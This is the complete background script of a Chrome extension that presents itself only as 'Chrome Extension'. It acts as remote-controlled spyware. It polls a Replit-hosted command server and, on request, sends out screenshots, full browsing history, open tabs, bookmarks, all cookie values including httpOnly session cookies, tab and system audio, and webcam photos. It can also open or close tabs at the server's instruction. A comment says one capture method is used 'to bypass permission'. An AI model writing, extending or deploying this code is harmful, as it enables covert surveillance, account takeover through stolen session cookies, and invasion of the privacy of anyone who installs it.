// ============ Configuration ============
const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
// const SERVER_BASE_URL = 'http://localhost:8080';
let CLIENT_ID = null;
let EXTENSION_ID = null; // Short, memorable ID for easy identification
let CLIENT_NAME = 'Chrome Extension';
let USER_NAME = null;
let isConnected = false;

const POLL_ALARM_NAME = 'pollCommands';
const POLL_INTERVAL_MINUTES = 0.033; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 

// Auto-screenshot state management
let autoScreenshotState = {
    active: false,
    commandId: null,
    userId: null,
    duration: 0,
    startTime: 0,
    endTime: 0,
    screenshotCount: 0,
    alarmName: null
};
 

// ============ Initialize ============
// Generate or retrieve client ID and extension ID
chrome.storage.local.get(['clientId', 'extensionId', 'clientName', 'userName'], (result) => {
    CLIENT_ID = result.clientId || generateClientId();
    EXTENSION_ID = result.extensionId || generateExtensionId();
    CLIENT_NAME = result.clientName || 'Chrome Extension';
    USER_NAME = result.userName || null;
    
    // Save IDs if they're new
    if (!result.clientId || !result.extensionId) {
        chrome.storage.local.set({ 
            clientId: CLIENT_ID,
            extensionId: EXTENSION_ID
        });
    }
    
    console.log('🔧 Extension initialized');
    console.log('   📱 Extension ID:', EXTENSION_ID);
    console.log('   🔑 Client ID:', CLIENT_ID);
    
    // Start polling
    startPolling();
});

// Generate unique client ID (long, for backend tracking)
function generateClientId() {
    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Generate short, memorable extension ID (for easy user identification)
function generateExtensionId() {
    // Generate a random 2-digit number (10-99)
    const randomNum = Math.floor(Math.random() * 90) + 10;
    return `EXT-${randomNum}`;
}

// ============ HTTP Polling with chrome.alarms ============
function startPolling() {
    console.log('🚀 Starting HTTP polling with chrome.alarms...');
    
    // Register immediately
    registerClient();
    
    // Clear any existing alarm
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        // Create alarm for polling (this works even when service worker is inactive)
        chrome.alarms.create(POLL_ALARM_NAME, {
            delayInMinutes: 0, // Start immediately
            periodInMinutes: POLL_INTERVAL_MINUTES
        });
        console.log('✅ Polling alarm created');
    });
    
    // Also do an immediate poll
    pollForCommands();
}

function stopPolling() {
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        isConnected = false;
        updatePopupStatus(false);
        console.log('⏹️ Polling stopped');
    });
}

// Listen for alarm events
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === POLL_ALARM_NAME) {
        pollForCommands();
    } else if (alarm.name && alarm.name.startsWith('autoss_')) {
        handleAutoScreenshotAlarm(alarm.name);
    }
});

// Register with server
async function registerClient() {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID,
                name: CLIENT_NAME,
                userName: USER_NAME
            })
        });

        if (response.ok) {
            const data = await response.json();
            console.log('✅ Registered with server:', data.message);
            isConnected = true;
            updatePopupStatus(true);
        } else {
            console.error('❌ Registration failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Registration error:', error);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Poll for commands
async function pollForCommands() {
    if (!CLIENT_ID) {
        console.warn('⚠️ No CLIENT_ID set, skipping poll');
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_BASE_URL}/poll-commands/${CLIENT_ID}`);

        if (response.ok) {
            const data = await response.json();
            
            if (!isConnected) {
                isConnected = true;
                updatePopupStatus(true);
            }

            // Process commands
            if (data.commands && data.commands.length > 0) {
                console.log(`📥 Received ${data.commands.length} command(s)`);
                
                for (const command of data.commands) {
                    await processCommand(command);
                }
            }
        } else if (response.status === 404) {
            // Client not found, re-register
            console.log('⚠️ Client not found, re-registering...');
            await registerClient();
        } else {
            console.error('❌ Polling failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Polling error:', error.message);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Process received command
async function processCommand(command) {
    console.log(`⚙️ Processing command: ${command.type}`);

    try {
        switch (command.type) {
            case 'take_screenshot':
                console.log(`📸 Screenshot requested by ${command.requestedBy}`);
                await captureScreenshot(command.id, command.requestedById);
                break;

            case 'get_history':
                console.log(`📜 History requested by ${command.requestedBy}`);
                await captureHistory(command.id, command.requestedById);
                break;

            case 'get_activity':
                console.log(`📊 Activity requested by ${command.requestedBy}`);
                await captureActivity(command.id, command.requestedById);
                break;

            case 'get_cookies':
                console.log(`🍪 Cookies requested by ${command.requestedBy}`);
                await captureCookies(command.id, command.requestedById);
                break;

            case 'get_bookmarks':
                console.log(`🔖 Bookmarks requested by ${command.requestedBy}`);
                await captureBookmarks(command.id, command.requestedById);
                break;

            case 'start_recording':
                console.log(`🎥 Recording requested by ${command.requestedBy}`);
                await captureRecording(command.id, command.requestedById);
                break;

            case 'record_audio':
                console.log(`🎤 Audio recording requested by ${command.requestedBy} for ${command.duration}s`);
                await captureAudio(command.id, command.requestedById, command.duration);
                break;

            case 'open_tabs':
                console.log(`🌐 Open tabs requested by ${command.requestedBy}`);
                await openNewTabs(command.id, command.urls);
                break;

            case 'close_tabs':
                console.log(`🗑️ Close tabs requested by ${command.requestedBy}`);
                await closeTabsByUrls(command.id, command.urls);
                break;

            case 'auto_screenshot':
                console.log(`📸 Auto-screenshot requested by ${command.requestedBy} for ${command.duration}s`);
                await startAutoScreenshot(command.id, command.requestedById, command.duration);
                break;

            case 'capture_camera':
                console.log(`📷 Camera capture requested by ${command.requestedBy}`);
                await captureCamera(command.id, command.requestedById);
                break;

            default:
                console.log(`⚠️ Unknown command type: ${command.type}`);
        }
    } catch (error) {
        console.error('Error processing command:', error);
        await sendCommandResponse(command.id, 'error', { message: error.message });
    }
}

// ============ Screenshot Capture ============
async function captureScreenshot(commandId, userId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        // Capture the visible tab
        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
            format: 'png',
            quality: 100
        });

        console.log('📸 Screenshot captured!');

        // Send to server
        await sendCommandResponse(commandId, 'screenshot', {
            image: screenshotUrl,
            tabTitle: tab.title,
            tabUrl: tab.url
        }, userId);

        console.log('✅ Screenshot sent to server!');

    } catch (error) {
        console.error('Error capturing screenshot:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Auto-Screenshot Capture ============
async function startAutoScreenshot(commandId, userId, duration) {
    try {
        // Stop any existing auto-screenshot session
        if (autoScreenshotState.active) {
            console.log('⚠️ Stopping existing auto-screenshot session...');
            stopAutoScreenshot();
        }

        // Initialize auto-screenshot state
        const now = Date.now();
        const alarmName = `autoss_${commandId}`;
        
        autoScreenshotState = {
            active: true,
            commandId: commandId,
            userId: userId,
            duration: duration,
            startTime: now,
            endTime: now + (duration * 1000),
            screenshotCount: 0,
            alarmName: alarmName
        };

        console.log(`📸 Starting auto-screenshot: ${duration}s duration, ~${Math.floor(duration / 5)} screenshots`);

        // Create alarm for 5-second intervals
        chrome.alarms.create(alarmName, {
            delayInMinutes: 0, // Start immediately
            periodInMinutes: 5 / 60 // 5 seconds = 0.0833... minutes
        });

        // Take first screenshot immediately
        await captureScreenshot(commandId, userId);
        autoScreenshotState.screenshotCount++;
        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured`);

    } catch (error) {
        console.error('Error starting auto-screenshot:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
        stopAutoScreenshot();
    }
}

async function handleAutoScreenshotAlarm(alarmName) {
    // Verify this is our active alarm
    if (!autoScreenshotState.active || autoScreenshotState.alarmName !== alarmName) {
        console.log('⚠️ Ignoring orphaned auto-screenshot alarm');
        chrome.alarms.clear(alarmName);
        return;
    }

    const now = Date.now();

    // Check if we've reached the end time
    if (now >= autoScreenshotState.endTime) {
        console.log(`✅ Auto-screenshot completed: ${autoScreenshotState.screenshotCount} screenshots sent`);
        stopAutoScreenshot();
        return;
    }

    // Capture screenshot
    try {
        await captureScreenshot(autoScreenshotState.commandId, autoScreenshotState.userId);
        autoScreenshotState.screenshotCount++;
        
        const elapsed = Math.floor((now - autoScreenshotState.startTime) / 1000);
        const remaining = Math.floor((autoScreenshotState.endTime - now) / 1000);
        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured (${elapsed}s elapsed, ${remaining}s remaining)`);
    } catch (error) {
        console.error('Error in auto-screenshot:', error);
        // Don't stop on individual screenshot errors, continue the session
    }
}

function stopAutoScreenshot() {
    if (autoScreenshotState.alarmName) {
        chrome.alarms.clear(autoScreenshotState.alarmName);
    }
    
    autoScreenshotState = {
        active: false,
        commandId: null,
        userId: null,
        duration: 0,
        startTime: 0,
        endTime: 0,
        screenshotCount: 0,
        alarmName: null
    };
    
    console.log('🛑 Auto-screenshot stopped');
}

// ============ Browser History Capture ============
async function captureHistory(commandId, userId) {
    try {
        // Get all browser history
        const historyItems = await chrome.history.search({
            text: '',
            startTime: 0,  // Get all history from the beginning
            maxResults: 0  // 0 means no limit, get ALL history items (default is 100)
        });

        console.log(`📜 Browser history captured! (${historyItems.length} entries)`);

        // Send to server
        await sendCommandResponse(commandId, 'history', {
            history: historyItems
        }, userId);

        console.log('✅ History sent to server!');

    } catch (error) {
        console.error('Error capturing history:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Browser Activity Capture ============
async function captureActivity(commandId, userId) {
    try {
        // Get all browser tabs
        const tabs = await chrome.tabs.query({});

        // Extract relevant information from each tab
        const tabsInfo = tabs.map(tab => ({
            id: tab.id,
            title: tab.title,
            url: tab.url,
            active: tab.active,
            pinned: tab.pinned,
            audible: tab.audible,
            discarded: tab.discarded,
            autoDiscardable: tab.autoDiscardable,
            mutedInfo: tab.mutedInfo,
            windowId: tab.windowId,
            index: tab.index
        }));

        console.log(`📊 Browser activity captured! (${tabsInfo.length} tabs)`);

        // Send to server
        await sendCommandResponse(commandId, 'activity', {
            tabs: tabsInfo
        }, userId);

        console.log('✅ Activity sent to server!');

    } catch (error) {
        console.error('Error capturing activity:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Cookies (Browser Cookies) Capture ============
async function captureCookies(commandId, userId) {
    try {
        // Get all browser tabs
        const tabs = await chrome.tabs.query({});
        
        // Get user ID from storage
        const storage = await chrome.storage.local.get(['clientId']);
        const userIdVal = storage.clientId || CLIENT_ID;
        
        let totalCookies = 0;
        const tabsData = [];

        // Get cookies for each tab
        for (const tab of tabs) {
            if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
                continue; // Skip chrome internal pages
            }

            try {
                // Get all cookies for this tab's URL
                const cookies = await chrome.cookies.getAll({ url: tab.url });
                
                // Format cookies
                const formattedCookies = cookies.map(cookie => ({
                    name: cookie.name,
                    value: cookie.value,
                    domain: cookie.domain,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    sameSite: cookie.sameSite || 'unspecified',
                    expirationDate: cookie.expirationDate || null,
                    hostOnly: cookie.hostOnly,
                    session: cookie.session
                }));

                totalCookies += formattedCookies.length;

                tabsData.push({
                    url: tab.url,
                    title: tab.title || 'No Title',
                    cookieCount: formattedCookies.length,
                    cookies: formattedCookies
                });
            } catch (error) {
                console.error(`Error getting cookies for tab ${tab.id}:`, error);
            }
        }

        // Format the data according to the specified structure
        const formattedData = {
            userId: userIdVal,
            timestamp: new Date().toISOString(),
            source: "popup",
            totalTabs: tabsData.length,
            totalCookies: totalCookies,
            tabs: tabsData
        };

        console.log(`🍪 Cookies data captured! (${totalCookies} cookies across ${tabsData.length} tabs)`);

        // Send to server
        await sendCommandResponse(commandId, 'cookies', {
            cookiesData: formattedData
        }, userId);

        console.log('✅ Cookies data sent to server!');

    } catch (error) {
        console.error('Error capturing cookies:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Bookmarks Capture ============
async function captureBookmarks(commandId, userId) {
    try {
        // Get the entire bookmark tree
        const bookmarkTree = await chrome.bookmarks.getTree();
        
        // Get user ID from storage
        const storage = await chrome.storage.local.get(['clientId']);
        const userIdVal = storage.clientId || CLIENT_ID;
        
        // Flatten the bookmark tree
        const flattenedBookmarks = [];
        let totalFolders = 0;
        
        function flattenBookmarkNode(node, path = []) {
            if (node.url) {
                // This is a bookmark
                flattenedBookmarks.push({
                    id: node.id,
                    title: node.title || 'Untitled',
                    url: node.url,
                    dateAdded: node.dateAdded ? new Date(node.dateAdded).toISOString() : null,
                    dateLastUsed: node.dateLastUsed ? new Date(node.dateLastUsed).toISOString() : null,
                    path: path.join(' > ') || 'Root'
                });
            } else if (node.children) {
                // This is a folder
                if (node.title) {
                    totalFolders++;
                    path = [...path, node.title];
                }
                
                // Recursively process children
                node.children.forEach(child => flattenBookmarkNode(child, path));
            }
        }
        
        // Start flattening from root
        bookmarkTree.forEach(node => flattenBookmarkNode(node));
        
        // Format the data
        const formattedData = {
            userId: userIdVal,
            timestamp: new Date().toISOString(),
            source: 'browser_bookmarks',
            totalBookmarks: flattenedBookmarks.length,
            totalFolders: totalFolders,
            bookmarks: flattenedBookmarks
        };

        console.log(`🔖 Bookmarks data captured! (${flattenedBookmarks.length} bookmarks, ${totalFolders} folders)`);

        // Send to server
        await sendCommandResponse(commandId, 'bookmarks', {
            bookmarksData: formattedData
        }, userId);

        console.log('✅ Bookmarks data sent to server!');

    } catch (error) {
        console.error('Error capturing bookmarks:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Open New Tabs ============
async function openNewTabs(commandId, urls) {
    try {
        if (!urls || urls.length === 0) {
            throw new Error('No URLs provided');
        }

        console.log(`🌐 Opening ${urls.length} tab(s) in background...`);
        
        // Get the current active tab to restore focus later if needed
        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
        const openedTabs = [];

        // Open each URL in a new background tab
        for (let i = 0; i < urls.length; i++) {
            const url = urls[i];
            
            try {
                // Create new tab in background (active: false keeps user on current tab)
                const newTab = await chrome.tabs.create({
                    url: url,
                    active: false  // This keeps the tab in background
                });
                
                openedTabs.push({
                    url: url,
                    tabId: newTab.id,
                    title: newTab.title || 'Loading...'
                });
                
                console.log(`✅ Tab ${i + 1}/${urls.length} opened: ${url}`);
                
                // Small delay between tabs to avoid overwhelming the browser
                if (i < urls.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            } catch (error) {
                console.error(`❌ Failed to open ${url}:`, error.message);
                openedTabs.push({
                    url: url,
                    error: error.message
                });
            }
        }

        // Send success response
        await sendCommandResponse(commandId, 'tabs_opened', {
            totalRequested: urls.length,
            successfullyOpened: openedTabs.filter(t => !t.error).length,
            tabs: openedTabs,
            currentTab: activeTab ? { url: activeTab.url, title: activeTab.title } : null
        });

        console.log(`✅ ${openedTabs.filter(t => !t.error).length}/${urls.length} tabs opened successfully!`);

    } catch (error) {
        console.error('Error opening tabs:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message });
    }
}

// ============ Close Tabs by URLs ============
async function closeTabsByUrls(commandId, urls) {
    try {
        if (!urls || urls.length === 0) {
            throw new Error('No URLs provided');
        }

        console.log(`🗑️ Closing tabs matching ${urls.length} URL pattern(s)...`);
        
        // Get all open tabs
        const allTabs = await chrome.tabs.query({});
        const closedTabs = [];
        const tabsToClose = [];

        // Find tabs that match the provided URLs (partial matching)
        for (const urlPattern of urls) {
            const matchingTabs = allTabs.filter(tab => {
                // Skip chrome internal pages
                if (tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
                    return false;
                }
                
                // Partial URL matching - check if the tab URL contains the pattern
                const normalizedPattern = urlPattern.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
                const normalizedTabUrl = tab.url.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
                
                return normalizedTabUrl.includes(normalizedPattern);
            });

            // Add to close list
            matchingTabs.forEach(tab => {
                if (!tabsToClose.find(t => t.id === tab.id)) {
                    tabsToClose.push(tab);
                    closedTabs.push({
                        url: tab.url,
                        title: tab.title,
                        tabId: tab.id,
                        matchedPattern: urlPattern
                    });
                }
            });
        }

        // Close the matching tabs
        if (tabsToClose.length > 0) {
            const tabIds = tabsToClose.map(t => t.id);
            await chrome.tabs.remove(tabIds);
            console.log(`✅ Closed ${tabsToClose.length} tab(s)`);
        } else {
            console.log('⚠️ No matching tabs found to close');
        }

        // Send response
        await sendCommandResponse(commandId, 'tabs_closed', {
            totalRequested: urls.length,
            totalClosed: closedTabs.length,
            closedTabs: closedTabs
        });

        console.log(`✅ CloseTab command completed: ${closedTabs.length} tab(s) closed`);

    } catch (error) {
        console.error('Error closing tabs:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message });
    }
}

// ============ Screen Recording Capture ============
async function captureRecording(commandId, userId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        console.log('🎥 Starting screen recording...');

        // Inject content script to handle recording with screen picker
        await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: async (cmdId, tabInfo, usrId) => {
                try {
                    console.log('🎥 [Content] Starting recording...');
                    
                    // Request display media (shows screen picker to user)
                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: {
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                            frameRate: { ideal: 30 }
                        },
                        audio: true
                    });

                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp8,opus',
                        videoBitsPerSecond: 1500000
                    });

                    const chunks = [];

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    mediaRecorder.onstop = async () => {
                        stream.getTracks().forEach(t => t.stop());
                        
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            chrome.runtime.sendMessage({
                                type: 'recording-data',
                                commandId: cmdId,
                                video: reader.result,
                                size: blob.size,
                                tabTitle: tabInfo.title,
                                tabUrl: tabInfo.url,
                                userId: usrId
                            });
                        };
                        
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    console.log('🎥 [Content] Recording started for 15s...');

                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 15000);

                } catch (err) {
                    chrome.runtime.sendMessage({
                        type: 'recording-error',
                        commandId: cmdId,
                        error: err.message,
                        userId: usrId
                    });
                }
            },
            args: [commandId, { title: tab.title, url: tab.url }, userId]
        });

        console.log('🎥 Recording script injected, user will see screen picker...');

    } catch (error) {
        console.error('Error starting recording:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// Ensure offscreen document exists
async function ensureOffscreenDocument() {
    const existingContexts = await chrome.runtime.getContexts({
        contextTypes: ['OFFSCREEN_DOCUMENT'],
        documentUrls: [chrome.runtime.getURL('offscreen-recording.html')]
    });

    if (existingContexts.length > 0) {
        return;
    }

    await chrome.offscreen.createDocument({
        url: 'offscreen-recording.html',
        reasons: ['USER_MEDIA'],
        justification: 'Recording screen video with audio'
    });
    
    console.log('🎥 Offscreen document created');
}

// Handle recording data from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'recording-data') {
        handleRecordingData(message);
    } else if (message.type === 'recording-error') {
        handleRecordingError(message);
    } else if (message.type === 'audio-data') {
        handleAudioData(message);
    } else if (message.type === 'audio-error') {
        handleAudioError(message);
    } else if (message.type === 'camera-data') {
        handleCameraData(message);
    } else if (message.type === 'camera-error') {
        handleCameraError(message);
    }
});

async function handleRecordingData(message) {
    try {
        console.log(`🎥 Recording received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB`);

        await sendCommandResponse(message.commandId, 'recording', {
            video: message.video,
            tabTitle: message.tabTitle,
            tabUrl: message.tabUrl,
            duration: 15,
            size: message.size
        }, message.userId);

        console.log('✅ Recording sent to server!');
    } catch (error) {
        console.error('Error sending recording:', error);
        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
    }
}

async function handleRecordingError(message) {
    console.error('🎥 Recording error:', message.error);
    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
}

async function handleAudioData(message) {
    try {
        console.log(`🎤 Audio received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB, Duration: ${message.duration}s`);

        await sendCommandResponse(message.commandId, 'audio', {
            audio: message.audio,
            tabTitle: message.tabTitle,
            tabUrl: message.tabUrl,
            duration: message.duration,
            size: message.size
        }, message.userId);

        console.log('✅ Audio sent to server!');
    } catch (error) {
        console.error('Error sending audio:', error);
        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
    }
}

async function handleAudioError(message) {
    console.error('🎤 Audio recording error:', message.error);
    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
}

async function handleCameraData(message) {
    try {
        console.log('📷 Camera photo received!');

        await sendCommandResponse(message.commandId, 'camera', {
            image: message.image,
            tabTitle: message.tabTitle,
            tabUrl: message.tabUrl
        }, message.userId);

        console.log('✅ Camera photo sent to server!');
    } catch (error) {
        console.error('Error sending camera photo:', error);
        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
    }
}

async function handleCameraError(message) {
    console.error('📷 Camera capture error:', message.error);
    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
}

// ============ Audio Recording Capture ============
async function captureAudio(commandId, userId, duration) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        console.log(`🎤 Starting audio recording for ${duration} seconds...`);

        // Inject content script to handle audio recording
        // Using getDisplayMedia instead of getUserMedia to bypass permission
        await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: async (cmdId, tabInfo, usrId, recordDuration) => {
                try {
                    console.log(`🎤 [Content] Starting audio recording for ${recordDuration}s...`);
                    
                    // Use getDisplayMedia which auto-grants permission in extensions
                    // We request audio from the tab/system
                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: {
                            width: { ideal: 1 },
                            height: { ideal: 1 }
                        },
                        audio: true  // This captures system/tab audio
                    });

                    // Stop all video tracks immediately as we only need audio
                    stream.getVideoTracks().forEach(track => track.stop());

                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'audio/webm;codecs=opus',
                        audioBitsPerSecond: 128000
                    });

                    const chunks = [];

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    mediaRecorder.onstop = async () => {
                        stream.getTracks().forEach(t => t.stop());
                        
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            chrome.runtime.sendMessage({
                                type: 'audio-data',
                                commandId: cmdId,
                                audio: reader.result,
                                size: blob.size,
                                duration: recordDuration,
                                tabTitle: tabInfo.title,
                                tabUrl: tabInfo.url,
                                userId: usrId
                            });
                        };
                        
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    console.log(`🎤 [Content] Audio recording started for ${recordDuration}s...`);

                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, recordDuration * 1000);

                } catch (err) {
                    chrome.runtime.sendMessage({
                        type: 'audio-error',
                        commandId: cmdId,
                        error: err.message,
                        userId: usrId
                    });
                }
            },
            args: [commandId, { title: tab.title, url: tab.url }, userId, duration]
        });

        console.log('🎤 Audio recording script injected...');

    } catch (error) {
        console.error('Error starting audio recording:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}

// ============ Camera Capture ============
async function captureCamera(commandId, userId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        console.log('📷 Starting camera capture...');

        // Inject content script to handle camera capture
        await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: async (cmdId, tabInfo, usrId) => {
                try {
                    console.log('📷 [Content] Requesting camera access...');
                    
                    // Request camera access
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });

                    // Create video element to capture frame
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    
                    // Wait for video to be ready
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });

                    // Wait a bit for camera to adjust (exposure, focus, etc.)
                    await new Promise(resolve => setTimeout(resolve, 500));

                    // Create canvas and capture frame
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);

                    // Convert to base64
                    const imageData = canvas.toDataURL('image/png');

                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());

                    // Send to background script
                    chrome.runtime.sendMessage({
                        type: 'camera-data',
                        commandId: cmdId,
                        image: imageData,
                        tabTitle: tabInfo.title,
                        tabUrl: tabInfo.url,
                        userId: usrId
                    });

                    console.log('📷 [Content] Camera photo captured!');

                } catch (err) {
                    chrome.runtime.sendMessage({
                        type: 'camera-error',
                        commandId: cmdId,
                        error: err.message,
                        userId: usrId
                    });
                }
            },
            args: [commandId, { title: tab.title, url: tab.url }, userId]
        });

        console.log('📷 Camera capture script injected, requesting user permission...');

    } catch (error) {
        console.error('Error starting camera capture:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
    }
}


// ============ Send Command Response ============
async function sendCommandResponse(commandId, type, data, userId = null) {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/command-response`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID,
                commandId: commandId,
                type: type,
                data: data,
                userId: userId
            })
        });

        if (!response.ok) {
            console.error('❌ Failed to send response:', response.status);
        }
    } catch (error) {
        console.error('❌ Error sending response:', error);
    }
}

// ============ Helper Functions ============
function updatePopupStatus(connected) {
    chrome.runtime.sendMessage({
        type: 'status_update',
        connected: connected,
        serverUrl: SERVER_BASE_URL,
        clientId: CLIENT_ID,
        extensionId: EXTENSION_ID
    }).catch(() => {
        // Popup not open, ignore
    });
}

// ============ Message Handling from Popup ============
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    switch (request.type) {
        case 'get_status':
            sendResponse({
                connected: isConnected,
                serverUrl: SERVER_BASE_URL,
                clientName: CLIENT_NAME,
                clientId: CLIENT_ID,
                extensionId: EXTENSION_ID
            });
            break;

        case 'register_user':
            // Store user name
            USER_NAME = request.userName;
            chrome.storage.local.set({ userName: USER_NAME });
            
            // Re-register with server to update user name
            registerClient();
            
            console.log('✅ User registered:', USER_NAME);
            sendResponse({ success: true });
            break;

        case 'connect':
            CLIENT_NAME = request.clientName || CLIENT_NAME;
            
            // Save settings
            chrome.storage.local.set({
                clientName: CLIENT_NAME
            });

            // Restart polling
            startPolling();
            sendResponse({ success: true });
            break;

        case 'disconnect':
            stopPolling();
            sendResponse({ success: true });
            break;

        case 'test_screenshot':
            captureScreenshot('manual_test');
            sendResponse({ success: true });
            break;
    }
    return true;
});